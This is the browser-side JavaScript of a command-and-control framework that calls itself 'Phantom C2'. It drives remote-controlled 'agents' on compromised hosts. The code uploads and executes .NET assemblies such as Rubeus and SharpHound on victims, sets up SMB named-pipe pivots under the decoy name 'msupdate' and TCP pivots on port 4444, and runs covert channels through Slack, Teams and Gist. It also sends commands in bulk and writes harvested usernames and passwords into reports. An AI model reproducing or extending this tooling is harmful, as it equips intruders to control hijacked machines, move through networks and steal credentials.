  const curTags = cur && cur.tags ? cur.tags.join(', ') : '';
  const input = prompt('Tags for "'+agentName+'" (comma-separated, e.g. "pivot, dc, red-team"):',  curTags);
  if (input === null) return; // cancelled
  // Normalise: lowercase, trim, dedupe
  const tags = [...new Set(input.split(',').map(t => t.trim().toLowerCase()).filter(Boolean))].join(',');
  await fetch('/api/agent/tags', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agentName, tags:tags})});
  refreshAll();
}

// ──── Colored Terminal Output ────
function colorizeOutput(text) {
  if (!text) return '';
  // Escape HTML first to prevent XSS
  text = text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  return text
    .replace(/\b(error|failed|denied|not found|refused|timeout)\b/gi, '<span style="color:var(--red)">$1</span>')
    .replace(/\b(success|ok|active|running|complete|found)\b/gi, '<span style="color:var(--green)">$1</span>')
    .replace(/\b(warning|deprecated|caution)\b/gi, '<span style="color:var(--yellow)">$1</span>')
    .replace(/(FLAG\{[^}]+\})/g, '<span style="color:#f59e0b;font-weight:bold;background:rgba(245,158,11,0.1);padding:1px 4px;border-radius:3px">$1</span>')
    .replace(/(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:\/\d{1,2})?)/g, '<span style="color:var(--cyan)">$1</span>')
    .replace(/((?:^|[ \t])(\/[\w\/._-]{3,}))/gm, '<span style="color:var(--accent-light)">$1</span>');
}

// ──── Engagement Notes (Global) ────
let engagementNotes = localStorage.getItem('phantom-engagement-notes') || '';

function saveEngagementNotes() {
  const el = document.getElementById('engagement-notes-text');
  if (el) {
    engagementNotes = el.value;
    localStorage.setItem('phantom-engagement-notes', engagementNotes);
  }
}

// ──── Agent Session Tabs ────
var agentTerminals = {}; // agentName → {html: termBody HTML}

function updateAgentTabs(agents) {
  var tabs = document.getElementById('agent-tabs');
  if (!tabs) return;
  var activeAgents = agents.filter(function(a) { return a.status === 'active'; })
    .sort(function(a,b) { return a.name.localeCompare(b.name); });
  var currentAgent = currentTermAgent || document.getElementById('agent-select').value;

  // Only rebuild tabs when the agent list actually changes
  var tabKey = activeAgents.map(function(a) { return a.name; }).join(',');
  if (tabKey !== window._lastTabKey) {
    window._lastTabKey = tabKey;
    var html = '<span style="color:var(--text-muted);font-size:11px;padding:6px 0;margin-right:6px">SESSIONS:</span>';
    activeAgents.forEach(function(a) {
      var osIcon = a.os === 'windows' ? '🪟' : (a.os === 'android' ? '📱' : (a.os === 'ios' ? '🍎' : '🐧'));
      html += '<button data-agent="' + a.name + '" onclick="switchAgentTab(\'' + a.name + '\')" style="border-radius:6px;padding:4px 12px;cursor:pointer;font-size:11px;display:flex;align-items:center;gap:4px">' +
        osIcon + ' ' + a.name + ' <span style="font-size:9px;color:var(--text-muted)">(' + a.hostname + ')</span></button>';
    });
    if (activeAgents.length === 0) {
      html += '<span style="color:var(--text-muted);font-size:11px;padding:6px">No active agents</span>';
    }
    tabs.innerHTML = html;
  }

  // Update active highlight in-place without rebuilding
  var buttons = tabs.querySelectorAll('button[data-agent]');
  buttons.forEach(function(btn) {
    var isActive = btn.getAttribute('data-agent') === currentAgent;
    btn.style.background = isActive ? 'var(--accent-glow)' : 'var(--bg-input)';
    btn.style.color = isActive ? 'var(--accent-light)' : 'var(--text-secondary)';
    btn.style.border = isActive ? '1px solid var(--accent)' : '1px solid var(--border)';
  });
}

function switchAgentTab(agentName) {
  // Save current terminal content
  var currentAgent = document.getElementById('agent-select').value;
  if (currentAgent) {
    agentTerminals[currentAgent] = { html: document.getElementById('term-body').innerHTML };
  }

  // Switch agent
  document.getElementById('agent-select').value = agentName;
  onAgentSelect();

  // Restore terminal content for this agent
  if (agentTerminals[agentName]) {
    document.getElementById('term-body').innerHTML = agentTerminals[agentName].html;
  } else {
    document.getElementById('term-body').innerHTML = '<div class="term-info">Session started with ' + agentName + '</div>';
  }

  // Update tabs highlight
  if (window._cachedAgents) updateAgentTabs(window._cachedAgents);
}

// ──── Terminal Assembly & Upload (below terminal) ────
function termAsmFileSelected(input) {
  var dz = document.getElementById('term-asm-dropzone');
  if (input.files && input.files[0]) {
    dz.innerHTML = '<span style="color:#10b981">⚡ ' + input.files[0].name + ' (' + Math.round(input.files[0].size/1024) + 'KB)</span>';
  }
}

function termUploadFileSelected(input) {
  var dz = document.getElementById('term-upload-dropzone');
  if (input.files && input.files[0]) {
    dz.innerHTML = '<span style="color:#10b981">📄 ' + input.files[0].name + ' (' + Math.round(input.files[0].size/1024) + 'KB)</span>';
  }
}

// .NET Assembly tab switcher
function asmTab(tab) {
  ['seatbelt','rubeus','sharphound','misc'].forEach(t => {
    const btn = document.getElementById('asmt-'+t);
    const panel = document.getElementById('asmq-'+t);
    const active = t === tab;
    if (btn) {
      btn.style.background = active ? 'rgba(234,179,8,0.15)' : 'var(--bg-input)';
      btn.style.borderColor = active ? 'rgba(234,179,8,0.5)' : 'var(--border)';
      btn.style.color = active ? '#ca8a04' : 'var(--text-muted)';
      btn.style.fontWeight = active ? '600' : '400';
    }
    if (panel) panel.style.display = active ? 'flex' : 'none';
  });
}

function setAsmArg(val) { document.getElementById('term-asm-args').value = val; }
function setUploadPath(val) { document.getElementById('term-upload-path').value = val; }

// Upload drag & drop
function uploadDropHandler(e) {
  e.preventDefault();
  const dt = e.dataTransfer;
  if (dt.files && dt.files[0]) {
    document.getElementById('term-upload-file').files = dt.files;
    uploadFileSelected();
  }
  e.currentTarget.style.borderColor = 'var(--border)';
}

function uploadFileSelected() {
  const f = document.getElementById('term-upload-file').files[0];
  if (!f) return;
  const label = document.getElementById('upload-drop-label');
  const badge = document.getElementById('upload-status-badge');
  if (label) label.innerHTML = '<span style="color:var(--green)">📄 ' + f.name + ' <span style="color:var(--text-muted)">(' + (f.size > 1048576 ? (f.size/1048576).toFixed(1)+'MB' : Math.round(f.size/1024)+'KB') + ')</span></span>';
  if (badge) { badge.textContent = 'FILE READY'; badge.style.background='rgba(34,197,94,0.12)'; badge.style.color='#16a34a'; badge.style.borderColor='rgba(34,197,94,0.3)'; }
}

// Pivot tab switcher
function pivotTab(tab) {
  ['smb','tcp'].forEach(t => {
    const btn = document.getElementById('pivot-tab-'+t);
    const panel = document.getElementById('pivot-panel-'+t);
    const active = t === tab;
    if (btn) {
      btn.style.background = active ? 'rgba(34,197,94,0.15)' : 'var(--bg-input)';
      btn.style.color = active ? '#16a34a' : 'var(--text-muted)';
      btn.style.fontWeight = active ? '600' : '400';
    }
    if (panel) panel.style.display = active ? 'block' : 'none';
  });
}

async function termExecuteAssembly() {
  var agent = document.getElementById('agent-select').value;
  var fileInput = document.getElementById('term-asm-file');
  var args = document.getElementById('term-asm-args').value.trim();
  var customPath = document.getElementById('term-asm-path').value.trim();

  if (!agent) { termLog('error', '✗ Select an agent first'); return; }
  if (!fileInput || !fileInput.files || !fileInput.files[0]) { termLog('error', '✗ Select a .NET assembly file first'); return; }

  var file = fileInput.files[0];
  var remotePath;
  if (customPath) {
    remotePath = customPath.endsWith('\\') || customPath.endsWith('/') ? customPath + file.name : customPath + '\\' + file.name;
  } else {
    remotePath = 'C:\\Windows\\Temp\\' + file.name;
  }

  termLog('system', '⚡ Uploading ' + file.name + ' (' + Math.round(file.size/1024) + 'KB) to ' + agent + '...');

  // Upload
  var formData = new FormData();
  formData.append('agent', agent);
  formData.append('file', file);
  formData.append('remote_path', remotePath);

  try {
    var resp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
    var data = await resp.json();
    if (data.error) { termLog('error', '✗ Upload failed: ' + data.error); return; }
    termLog('success', '✓ Uploaded to ' + remotePath);
  } catch(e) { termLog('error', '✗ Upload error: ' + e.message); return; }

  // Execute
  termLog('system', '⚡ Executing: assembly ' + remotePath + ' ' + args);
  var cmdArgs = remotePath + (args ? ' ' + args : '');
  try {
    var resp2 = await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agent, command:'assembly', args:cmdArgs})});
    var data2 = await resp2.json();
    if (data2.error) { termLog('error', '✗ ' + data2.error); return; }
    termLog('success', '✓ Assembly task queued (ID: ' + data2.task_id.substring(0,8) + ') — waiting for agent check-in...');

    // Poll for result
    for (var i = 0; i < 15; i++) {
      await new Promise(function(r) { setTimeout(r, 4000); });
      var detail = await fetchJ('/api/agent/' + agent);
      if (detail.tasks) {
        for (var t = 0; t < detail.tasks.length; t++) {
          var task = detail.tasks[t];
          if (data2.task_id.startsWith(task.id) || task.id.startsWith(data2.task_id.substring(0,8))) {
            if (task.status !== 'pending' && task.status !== 'sent') {
              if (task.output) { termLog('output', task.output); }
              if (task.error) { termLog('error', task.error); }
              return;
            }
          }
        }
      }
    }
    termLog('info', 'Timeout — check agent task history');
  } catch(e) { termLog('error', '✗ ' + e.message); }
}

async function termUploadFile() {
  var agent = document.getElementById('agent-select').value;
  var fileInput = document.getElementById('term-upload-file');
  var remotePath = document.getElementById('term-upload-path').value.trim();

  if (!agent) { termLog('error', '✗ Select an agent first'); return; }
  if (!fileInput || !fileInput.files || !fileInput.files[0]) { termLog('error', '✗ Select a file first'); return; }

  var file = fileInput.files[0];
  if (!remotePath) { remotePath = 'C:\\Windows\\Temp\\' + file.name; }

  termLog('system', '📤 Uploading ' + file.name + ' → ' + remotePath);

  var formData = new FormData();
  formData.append('agent', agent);
  formData.append('file', file);
  formData.append('remote_path', remotePath);

  try {
    var resp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
    var data = await resp.json();
    if (data.error) { termLog('error', '✗ ' + data.error); return; }
    termLog('success', '✓ Upload queued: ' + remotePath + ' (' + data.size + ' bytes, task: ' + data.task_id.substring(0,8) + ')');
  } catch(e) { termLog('error', '✗ ' + e.message); }
}

// ──── SMB Pivot Control ────
async function sendPivotCmd(action) {
  var agent = document.getElementById('agent-select').value;
  if (!agent) { document.getElementById('pivot-result').textContent = '✗ Select an agent first'; return; }
  var pipeName = document.getElementById('pivot-pipe-name').value.trim() || 'msupdate';
  var args = action === 'start' ? 'start ' + pipeName : action;
  var el = document.getElementById('pivot-result');
  el.style.color = 'var(--text-muted)';
  el.textContent = '⏳ Sending pivot ' + action + '...';
  try {
    var resp = await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({agent: agent, command: 'pivot', args: args})});
    var data = await resp.json();
    if (data.error) { el.style.color='var(--red)'; el.textContent='✗ '+data.error; return; }
    el.style.color = 'var(--text-muted)';
    el.textContent = '⏳ Task queued: ' + data.task_id.substring(0,8) + '\nWaiting for result...';
    // Poll for result
    var tid = data.task_id;
    for (var i = 0; i < 20; i++) {
      await new Promise(r => setTimeout(r, 1500));
      var tr = await fetch('/api/tasks'); var tdata = await tr.json();
      var task = tdata.find(t => t.id === tid);
      if (task && task.status === 'complete') {
        el.style.color = 'var(--green)';
        el.textContent = task.output || '[done]';
        return;
      }
      if (task && task.status === 'error') {
        el.style.color = 'var(--red)';
        el.textContent = '✗ ' + (task.error || task.output);
        return;
      }
    }
    el.textContent = '⏳ Still running — check Tasks tab for output';
  } catch(e) { el.style.color='var(--red)'; el.textContent='✗ '+e.message; }
}

// ──── TCP Pivot Control ────
async function sendTCPPivotCmd(action) {
  var agent = document.getElementById('agent-select').value;
  var el = document.getElementById('pivot-result');
  if (!agent) { el.textContent = '✗ Select an agent first'; return; }
  var addr = document.getElementById('pivot-tcp-addr').value.trim() || '4444';
  var args = action === 'tcp-start' ? 'tcp-start ' + addr : action;
  el.style.color = 'var(--text-muted)';
  el.textContent = '⏳ Sending TCP pivot ' + action + '...';
  try {
    var resp = await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({agent: agent, command: 'pivot', args: args})});
    var data = await resp.json();
    if (data.error) { el.style.color='var(--red)'; el.textContent='✗ '+data.error; return; }
    el.style.color = 'var(--text-muted)';
    el.textContent = '⏳ Task queued — waiting for result...';
    var tid = data.task_id;
    for (var i = 0; i < 20; i++) {
      await new Promise(r => setTimeout(r, 1500));
      var tr = await fetch('/api/tasks'); var tdata = await tr.json();
      var task = tdata.find(t => t.id === tid);
      if (task && task.status === 'complete') { el.style.color='var(--green)'; el.textContent=task.output||'[done]'; return; }
      if (task && task.status === 'error') { el.style.color='var(--red)'; el.textContent='✗ '+(task.error||task.output); return; }
    }
    el.textContent = '⏳ Still running — check Tasks tab';
  } catch(e) { el.style.color='var(--red)'; el.textContent='✗ '+e.message; }
}

function selectExChannel(val) {
  document.getElementById('exchannel-name').value = val;
  ['slack','teams','gist'].forEach(c => {
    const card = document.getElementById('exc-card-'+c);
    if (!card) return;
    const active = c === val;
    card.style.border = active ? '2px solid rgba(56,189,248,0.5)' : '1px solid var(--border)';
    card.style.background = active ? 'rgba(56,189,248,0.08)' : 'var(--bg-input)';
    card.querySelector('span:nth-child(2)').style.color = active ? '#0ea5e9' : 'var(--text-muted)';
  });
}

// ──── ExC2 Channel Control ────
async function sendExChannelCmd(action) {
  var name = document.getElementById('exchannel-name').value;
  var el = document.getElementById('exchannel-result');
  el.style.color = 'var(--text-muted)';
  el.textContent = '⏳ ' + action + 'ing ' + name + ' channel...';
  try {
    var resp = await fetch('/api/exchannel/' + action, {method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({name: name})});
    var data = await resp.json();
    if (data.error) { el.style.color='var(--red)'; el.textContent='✗ '+data.error; return; }
    el.style.color = 'var(--green)';
    el.textContent = '[+] Channel ' + name + ': ' + action + 'ed';
  } catch(e) { el.style.color='var(--red)'; el.textContent='✗ '+e.message; }
}

async function loadExChannels() {
  var el = document.getElementById('exchannel-result');
  try {
    var resp = await fetch('/api/exchannel/list');
    var data = await resp.json();
    if (!data || data.length === 0) { el.style.color='var(--text-muted)'; el.textContent='No channels registered'; return; }
    el.style.color = 'var(--green)';
    el.textContent = data.map(c => (c.running ? '▶ ' : '■ ') + c.name).join('\n');
  } catch(e) { el.style.color='var(--red)'; el.textContent='✗ '+e.message; }
}

// ──── .NET Assembly Execution (Settings page — kept for backward compat) ────
function asmFileSelected(input) {
  var dz = document.getElementById('asm-dropzone');
  if (input.files && input.files[0]) {
    var f = input.files[0];
    dz.innerHTML = '<div style="color:#10b981;font-size:13px">⚡ ' + f.name + ' (' + Math.round(f.size/1024) + 'KB)</div>';
  }
}

function setAsmArgs(args) {
  document.getElementById('asm-args').value = args;
  document.getElementById('asm-inline-args').value = args;
}

async function executeAssemblyUpload() {
  var agent = document.getElementById('asm-agent').value;
  var fileInput = document.getElementById('asm-file');
  var args = document.getElementById('asm-args').value.trim();
  var result = document.getElementById('asm-upload-result');

  if (!agent) { alert('Select an agent first'); return; }
  if (!fileInput || !fileInput.files || fileInput.files.length === 0) { alert('Select a .NET assembly file first'); return; }

  var file = fileInput.files[0];
  var remotePath = 'C:\\Users\\Public\\' + file.name;

  result.innerHTML = '<span style="color:#f59e0b;">Step 1/2: Uploading ' + file.name + ' to agent...</span>';

  // Step 1: Upload file to agent
  var formData = new FormData();
  formData.append('agent', agent);
  formData.append('file', file);
  formData.append('remote_path', remotePath);

  try {
    var uploadResp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
    var uploadData = await uploadResp.json();
    if (uploadData.error) {
      result.innerHTML = '<span style="color:#ef4444;">Upload failed: ' + uploadData.error + '</span>';
      return;
    }
    result.innerHTML = '<span style="color:#f59e0b;">Step 2/2: Executing assembly...</span>';
  } catch(e) {
    result.innerHTML = '<span style="color:#ef4444;">Upload error: ' + e.message + '</span>';
    return;
  }

  // Step 2: Execute the uploaded assembly
  var cmdArgs = remotePath + (args ? ' ' + args : '');
  try {
    var resp = await fetch('/api/cmd', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({agent:agent, command:'assembly', args:cmdArgs})
    });
    var data = await resp.json();
    if (data.error) {
      result.innerHTML = '<span style="color:#ef4444;">' + data.error + '</span>';
      return;
    }
    result.innerHTML = '<span style="color:#10b981;">Assembly uploaded and queued (task: ' + data.task_id.substring(0,8) + '). Check terminal for output.</span>';
  } catch(e) {
    result.innerHTML = '<span style="color:#ef4444;">' + e.message + '</span>';
  }
}

async function executeAssemblyInline() {
  const agent = document.getElementById('asm-inline-agent').value;
  const b64 = document.getElementById('asm-b64').value.trim();
  const args = document.getElementById('asm-inline-args').value.trim();
  const result = document.getElementById('asm-inline-result');

  if (!agent) { alert('Select an agent'); return; }
  if (!b64) { alert('Paste base64-encoded assembly'); return; }

  result.innerHTML = '<span style="color:var(--yellow)">Executing...</span>';

  const cmdArgs = 'inline ' + b64 + (args ? ' ' + args : '');
  try {
    const resp = await fetch('/api/cmd', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({agent:agent, command:'assembly', args:cmdArgs})
    });
    const data = await resp.json();
    if (data.error) { result.innerHTML = '<span style="color:var(--red)">'+data.error+'</span>'; return; }
    result.innerHTML = '<span style="color:var(--green)">Assembly queued (task: '+data.task_id.substring(0,8)+'). Check terminal for output.</span>';
  } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
}

// Populate assembly agent selectors
function updateAsmAgents(agents) {
  ['asm-agent','asm-inline-agent'].forEach(id => {
    const sel = document.getElementById(id);
    if (!sel) return;
    const cur = sel.value;
    sel.innerHTML = '<option value="">Select agent...</option>' + agents.filter(a=>a.status==='active').map(a =>
      '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+a.name+' ('+a.hostname+')</option>'
    ).join('');
  });
}

// ──── API Key Management ────
async function createAPIKey() {
  const name = document.getElementById('apikey-name').value.trim() || 'api-key';
  const resp = await fetch('/api/keys', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'create', name:name})});
  const data = await resp.json();
  if (data.key) {
    document.getElementById('apikey-result').innerHTML =
      '<div style="background:var(--bg-input);border:1px solid var(--green);border-radius:var(--radius);padding:12px;margin-bottom:8px">' +
      '<div style="font-size:11px;color:var(--green);margin-bottom:4px">Key created — copy it now (shown only once)</div>' +
      '<code style="font-size:13px;word-break:break-all;color:var(--text-primary)">' + data.key + '</code>' +
      '<div style="margin-top:8px;font-size:11px;color:var(--text-muted)">Usage: curl -H "X-API-Key: ' + data.key + '" http://localhost:3000/api/agents</div></div>';
    document.getElementById('apikey-name').value = '';
    loadAPIKeys();
  }
}
async function loadAPIKeys() {
  const list = document.getElementById('apikey-list');
  if (!list) return;
  const keys = await fetchJ('/api/keys');
  if (!keys || keys.length === 0) { list.innerHTML = '<div style="color:var(--text-muted);font-size:12px;text-align:center;padding:12px">No API keys</div>'; return; }
  list.innerHTML = keys.map(k =>
    '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px;background:var(--bg-input);border:1px solid var(--border);border-radius:6px;margin-bottom:4px">' +
    '<div><span style="font-weight:600;font-size:12px">'+k.name+'</span> <code style="font-size:10px;color:var(--text-muted)">'+k.key+'</code>' +
    '<div style="font-size:10px;color:var(--text-muted)">Created: '+k.created_at+' | Last used: '+(k.last_used||'never')+' | Requests: '+k.requests+'</div></div>' +
    '<button class="qbtn" onclick="revokeAPIKey(\''+k.key+'\')" style="color:var(--red);font-size:10px;padding:3px 8px">Revoke</button></div>'
  ).join('');
}
async function revokeAPIKey(key) {
  if (!confirm('Revoke this API key?')) return;
  await fetch('/api/keys', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'revoke', key:key})});
  loadAPIKeys();
}

// ──── Task Queue ────
async function loadTaskQueue() {
  const table = document.getElementById('taskqueue-table');
  if (!table) return;
  const tasks = await fetchJ('/api/taskqueue');
  if (!tasks || tasks.length === 0) {
    table.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:20px">No pending tasks — all commands have been executed</td></tr>';
    return;
  }
  table.innerHTML = tasks.map(t =>
    '<tr><td style="font-weight:600">'+t.agent+'</td><td style="color:var(--cyan)">'+t.type+'</td>' +
    '<td style="font-family:monospace;font-size:11px">'+t.args+'</td>' +
    '<td>'+badge(t.status)+'</td><td style="color:var(--text-muted);font-size:11px">'+t.created+'</td></tr>'
  ).join('');
}

// ──── File Upload to Agent ────
function updateDropzone(input) {
  const dz = document.getElementById('upload-dropzone');
  if (input.files.length > 0) {
    const f = input.files[0];
    dz.innerHTML = '<div style="color:var(--green);font-size:13px">📄 ' + f.name + ' (' + (f.size/1024).toFixed(1) + ' KB)</div>';
  }
}
async function uploadToAgent() {
  const agent = document.getElementById('upload-agent').value;
  const file = document.getElementById('upload-file').files[0];
  const remotePath = document.getElementById('upload-path').value;
  const result = document.getElementById('upload-result');

  if (!agent) { alert('Select an agent'); return; }
  if (!file) { alert('Select a file'); return; }

  result.innerHTML = '<span style="color:var(--yellow)">Uploading...</span>';

  const formData = new FormData();
  formData.append('agent', agent);
  formData.append('file', file);
  if (remotePath) formData.append('remote_path', remotePath);

  try {
    const resp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
    const data = await resp.json();
    if (data.error) { result.innerHTML = '<span style="color:var(--red)">'+data.error+'</span>'; return; }
    result.innerHTML = '<span style="color:var(--green)">Uploaded: '+data.remote_path+' ('+data.size+' bytes, task: '+data.task_id.substring(0,8)+')</span>';
  } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
}
// Populate upload agent selector
function updateUploadAgents(agents) {
  const sel = document.getElementById('upload-agent');
  if (!sel) return;
  const cur = sel.value;
  sel.innerHTML = '<option value="">Select agent...</option>' + agents.filter(a=>a.status==='active').map(a =>
    '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+a.name+' ('+a.hostname+')</option>'
  ).join('');
}

// ──── Agent Health Chart ────
let healthHistory = {};
function drawHealthChart(agents) {
  const canvas = document.getElementById('health-chart');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const dpr = window.devicePixelRatio || 1;
  const w = canvas.parentElement.clientWidth;
  const h = 200;
  canvas.width = w*dpr; canvas.height = h*dpr;
  canvas.style.width = w+'px'; canvas.style.height = h+'px';
  ctx.scale(dpr,dpr);
  ctx.clearRect(0,0,w,h);

  // Track check-in counts over time
  const now = Date.now();
  agents.forEach(a => {
    if (!healthHistory[a.name]) healthHistory[a.name] = [];
    const isActive = a.status === 'active' ? 1 : 0;
    healthHistory[a.name].push({t:now, v:isActive});
    if (healthHistory[a.name].length > 30) healthHistory[a.name].shift();
  });

  // Draw axes
  ctx.strokeStyle = 'rgba(42,48,80,0.5)'; ctx.lineWidth = 1;
  ctx.beginPath(); ctx.moveTo(40,10); ctx.lineTo(40,h-30); ctx.lineTo(w-10,h-30); ctx.stroke();

  // Labels
  ctx.fillStyle = '#5a6580'; ctx.font = '9px Inter'; ctx.textAlign = 'center';
  ctx.fillText('Agent Check-in Health (last 2 minutes)', w/2, h-5);
  ctx.textAlign = 'right';
  ctx.fillText('Active', 38, 20);
  ctx.fillText('Dead', 38, h-35);

  // Plot each agent
  const names = Object.keys(healthHistory);
  const lineColors = ['#10b981','#3b82f6','#f59e0b','#ef4444','#a78bfa','#06b6d4','#ec4899','#84cc16'];

  names.forEach((name, ni) => {
    const points = healthHistory[name];
    if (points.length < 2) return;
    const color = lineColors[ni % lineColors.length];
    ctx.strokeStyle = color; ctx.lineWidth = 2; ctx.globalAlpha = 0.8;
    ctx.beginPath();
    points.forEach((p, pi) => {
      const x = 45 + (pi / Math.max(points.length-1,1)) * (w-60);
      const y = p.v ? 20 : h-35;
      pi === 0 ? ctx.moveTo(x,y) : ctx.lineTo(x,y);
    });
    ctx.stroke();
    ctx.globalAlpha = 1;

    // Legend dot
    ctx.fillStyle = color;
    ctx.beginPath(); ctx.arc(50+ni*80, h-15, 4, 0, Math.PI*2); ctx.fill();
    ctx.fillStyle = '#8892b0'; ctx.font = '8px Inter'; ctx.textAlign = 'left';
    ctx.fillText(name.substring(0,10), 58+ni*80, h-12);
  });
}

// ──── Bulk Agent Actions ────
function bulkToggleAll(cb) {
  document.querySelectorAll('.bulk-cb').forEach(c => c.checked = cb.checked);
}
function bulkSelectAll() {
  document.querySelectorAll('.bulk-cb').forEach(c => c.checked = true);
  document.getElementById('bulk-all').checked = true;
}
async function bulkSendCmd() {
  const cmd = document.getElementById('bulk-cmd').value.trim();
  if (!cmd) { alert('Enter a command first'); return; }
  const selected = [...document.querySelectorAll('.bulk-cb:checked')].map(c => c.dataset.agent);
  if (selected.length === 0) { alert('Select at least one agent'); return; }
  const parts = cmd.split(' ');
  const command = parts[0];
  const args = parts.slice(1).join(' ');
  let count = 0;
  for (const agent of selected) {
    await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agent, command:command, args:args})});
    count++;
  }
  alert('Command sent to ' + count + ' agents: ' + cmd);
  document.getElementById('bulk-cmd').value = '';
}
async function bulkRemoveDead() {
  const dead = [...document.querySelectorAll('.bulk-cb')].filter(c => c.dataset.status === 'dead');
  if (dead.length === 0) { alert('No dead agents to remove'); return; }
  if (!confirm('Remove ' + dead.length + ' dead agents?')) return;
  for (const c of dead) {
    await fetch('/api/agent/remove', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:c.dataset.id})});
  }
  refreshAll();
}

// ──── Report Generator ────
async function generateReport() {
  try {
    const agents = await fetchJ('/api/agents');
    const tasks = await fetchJ('/api/tasks');
    const events = await fetchJ('/api/events') || [];
    const audit = await fetchJ('/api/auditlog') || [];

    let md = '# Phantom C2 — Engagement Report\\n';
    md += '**Generated:** ' + new Date().toISOString() + '\\n\\n';
    md += '## Agents (' + agents.length + ')\\n\\n';
    md += '| Name | OS | Hostname | IP | Status |\\n|---|---|---|---|---|\\n';
    agents.forEach(a => md += '| ' + a.name + ' | ' + a.os + ' | ' + a.hostname + ' | ' + a.ip + ' | ' + a.status + ' |\\n');
    md += '\\n## Tasks (' + tasks.length + ')\\n\\n';
    md += '| Agent | Type | Command | Status | Time |\\n|---|---|---|---|---|\\n';
    tasks.slice(0,50).forEach(t => md += '| ' + t.agent + ' | ' + t.type + ' | ' + (t.args||'').substring(0,40) + ' | ' + t.status + ' | ' + t.time + ' |\\n');
    md += '\\n## Operator Audit Log (' + audit.length + ' entries)\\n\\n';
    audit.slice(-20).forEach(e => md += '- [' + e.time + '] ' + e.operator + ' → ' + e.agent + ': ' + e.action + ' ' + e.detail + '\\n');
    md += '\\n## Credentials\\n\\n';
    credentials.forEach(c => md += '- **' + c.source + '** ' + c.username + ' / ' + c.password + ' (' + c.type + ')\\n');
    md += '\\n## Notes\\n\\n' + (engagementNotes || 'No notes recorded.');

    const blob = new Blob([md.replace(/\\\\n/g,'\\n')], {type:'text/markdown'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'phantom-report-' + new Date().toISOString().slice(0,10) + '.md';
    a.click(); URL.revokeObjectURL(url);
  } catch(e) { alert('Report error: ' + e.message); }
}

// ──── Theme Presets ────
const themePresets = {
  dark: {name:'Phantom Dark',bg:'#0a0e1a',secondary:'#111827',accent:'#7c3aed',accentLight:'#a78bfa',text:'#e8ecf4'},
  light: {name:'Light',bg:'#f0f2f5',secondary:'#ffffff',accent:'#7c3aed',accentLight:'#6d28d9',text:'#1f2937'},
  cobalt: {name:'Cobalt Strike',bg:'#0c1021',secondary:'#141a2e',accent:'#3b82f6',accentLight:'#60a5fa',text:'#c8d6e5'},
  mythic: {name:'Mythic Dark',bg:'#1a1a2e',secondary:'#16213e',accent:'#e94560',accentLight:'#ff6b81',text:'#eaeaea'},
  hacker: {name:'Hacker Green',bg:'#0a0a0a',secondary:'#111111',accent:'#00ff41',accentLight:'#39ff14',text:'#00ff41'},
};

function applyThemePreset(preset) {
  const t = themePresets[preset];
  if (!t) return;
  const root = document.documentElement;
  if (preset === 'light') { root.setAttribute('data-theme','light'); }
  else {
    root.setAttribute('data-theme','dark');
    root.style.setProperty('--bg-primary', t.bg);
    root.style.setProperty('--bg-secondary', t.secondary);
    root.style.setProperty('--accent', t.accent);
    root.style.setProperty('--accent-light', t.accentLight);
    root.style.setProperty('--accent-glow', t.accent.replace(')',',0.15)').replace('rgb','rgba'));
    root.style.setProperty('--text-primary', t.text);
  }
  localStorage.setItem('phantom-theme-preset', preset);
  document.getElementById('theme-btn').firstChild.textContent = preset === 'light' ? '☀️' : '🌙';
}

// ──── Webhook Config ────
async function configureWebhook() {
  const url = prompt('Webhook URL (Slack/Discord):');
  if (!url) return;
  // Store locally and test
  localStorage.setItem('phantom-webhook', url);
  try {
    await fetch(url, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content:'Phantom C2 webhook configured!', text:'Phantom C2 webhook configured!'})});
    alert('Webhook configured and test message sent!');
  } catch(e) { alert('Webhook saved but test failed: ' + e.message); }
}

// ──── Kill Date Management ────
async function setKillDate() {
  const agent = document.getElementById('agent-select').value;
  if (!agent) { alert('Select an agent first'); return; }
  const date = prompt('Kill date (YYYY-MM-DD) — agent self-destructs after this date:');
  if (!date || !/^\d{4}-\d{2}-\d{2}$/.test(date)) { alert('Invalid format. Use YYYY-MM-DD'); return; }
  await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agent, command:'shell', args:'echo Kill date set: ' + date})});
  termLog('system', 'Kill date set to ' + date + ' for ' + agent);
}

// ──── Engagement Timer ────
const engagementStart = Date.now();
function updateTimer() {
  const elapsed = Math.floor((Date.now() - engagementStart) / 1000);
  const h = String(Math.floor(elapsed/3600)).padStart(2,'0');
  const m = String(Math.floor((elapsed%3600)/60)).padStart(2,'0');
  const s = String(elapsed%60).padStart(2,'0');
  const el = document.getElementById('engagement-timer');
  if (el) el.textContent = '⏱ ' + h + ':' + m + ':' + s;
}
setInterval(updateTimer, 1000);

// ──── Browser Notifications ────
let notificationsEnabled = false;
